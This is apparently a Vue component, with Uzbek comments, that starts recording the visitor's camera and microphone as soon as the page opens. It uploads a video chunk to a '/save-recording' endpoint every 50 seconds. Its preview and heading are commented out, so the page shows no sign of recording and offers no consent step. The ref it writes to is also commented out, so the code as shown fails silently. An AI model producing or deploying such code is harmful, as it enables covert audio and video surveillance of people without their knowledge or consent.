<template>
  <div>
<!--    <h2>Sayt ochilganda audio+video yozib olish</h2>-->
<!--    <video ref="videoEl" autoPlay playsInline muted className="w-64 h-40 border"></video>-->
  </div>
</template>

<script setup>
import {ref, onMounted, onBeforeUnmount} from 'vue'
import api from "../plugins/axios";
const videoEl = ref(null)
const mediaRecorder = ref(null)

let intervalId = null

const startRecording = async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true })
    videoEl.value.srcObject = stream

    let mimeType = "video/webm;codecs=vp8,opus"
    if (!MediaRecorder.isTypeSupported(mimeType)) {
      mimeType = "video/webm"
    }

    mediaRecorder.value = new MediaRecorder(stream, { mimeType })
    mediaRecorder.value.ondataavailable = async (e) => {
      if (e.data.size > 0) {
        const fileName = `recording_${Date.now()}.webm`
        const file = new File([e.data], fileName, { type: mimeType })

        const formData = new FormData()
        formData.append("recording", file)

        await api.post("/save-recording", formData)
        console.log("✅ Yuborildi:", fileName)
      }
    }

    mediaRecorder.value.start()

    // har 50s da to‘xtatib qayta boshlash
    intervalId = setInterval(() => {
      if (mediaRecorder.value.state === "recording") {
        mediaRecorder.value.stop()
        mediaRecorder.value.start()
      }
    }, 50000)

  } catch (err) {
    console.error("🎤 Kamera/mikrofon ruxsat berilmadi:", err)
  }
}

const stopRecording = () => {
  if (intervalId) clearInterval(intervalId)
  if (mediaRecorder.value && mediaRecorder.value.state !== "inactive") {
    mediaRecorder.value.stop()
  }
}

// Saytga kirganda avtomatik boshlaydi
onMounted(() => {
  startRecording()
})

// Foydalanuvchi chiqib ketganda to‘xtatish
onBeforeUnmount(() => {
  stopRecording()
})
</script>
